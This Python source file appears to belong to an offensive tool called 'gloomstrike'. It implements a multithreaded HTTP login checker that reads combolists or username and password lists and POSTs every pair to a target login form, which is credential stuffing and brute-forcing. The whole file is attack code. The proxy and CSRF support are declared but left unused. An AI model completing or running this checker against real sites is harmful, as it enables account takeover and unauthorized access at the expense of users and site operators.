import mmap, requests, threading, time
from gloomstrike import logger, helpers

class Proxy:

    def __init__(self, proxy_type: str, endpoint: str, username: str=None, password: str=None) -> None:

        self._proxy_type = proxy_type
        self._endpoint = endpoint
        self._username = username
        self._password = password

class HttpChecker:

    def __init__(self, url: str, csrf: str=None, parameters: list[list[str, str]]=None, logger: logger.Logger=None) -> None:

        self._url = url
        self._csrf = csrf
        self._parameters = parameters
        self._logger = logger

        self._credentials = helpers.QueueHandler()
        self._event = threading.Event()

        self._threads = []
        self._results = []

        self._combolist = None
        self._usernames = None
        self._passwords = None

    def load(self, combolist: str, usernames: str, passwords: str, proxies: str):

        try:

            if combolist:

                with open(combolist, 'r+b') as f:

                    while combo := f.readline().rstrip():

                        if not ':' in combo:
                            continue

                        username, password = combo.split(':')

                        self._credentials.add([username, password])

                return True

            elif usernames and passwords:
                
                with open(usernames, 'r+b') as f_usernames:

                    while username := f_usernames.readline().rstrip():

                        with open(passwords, 'r+b') as f_passwords:

                            while password := f_passwords.readline().rstrip():

                                self._credentials.add([username, password])
                return True

        except Exception as e:
            self._logger.error(e)

        return False

    def _background(self):

        try:
            time.sleep(1 / 1000)
        except KeyboardInterrupt:
            self._event.set()

        for thread in self._threads:
            thread.join()

        return self._results

    def _check(self, url: str, username: str, password: str, parameters: list[list[str, str]]):

        resp = requests.post(url, data={parameters[0]: username, parameters[1]: password})

        return resp

    def _checker(self):

        while not self._event.is_set():

            for username, password in self._credentials:

                print(username, password)

                if not (result := self._check(self._url, username, password, self._parameters)):
                    continue

                print(result.text)

            time.sleep(1 / 1000)

    def start(self, threads: int, background: bool=False):

        self._logger.info('Starting threads...')

        for _ in range(threads):

            thread = threading.Thread(target=self._checker)
            thread.daemon = True
            thread.start()

            self._threads.append(thread)

        if background:

            self._background_thread = threading.Thread(target=self._background)
            self._background_thread.daemon = True
            self._background_thread.start()
        
        else:
            return self._background()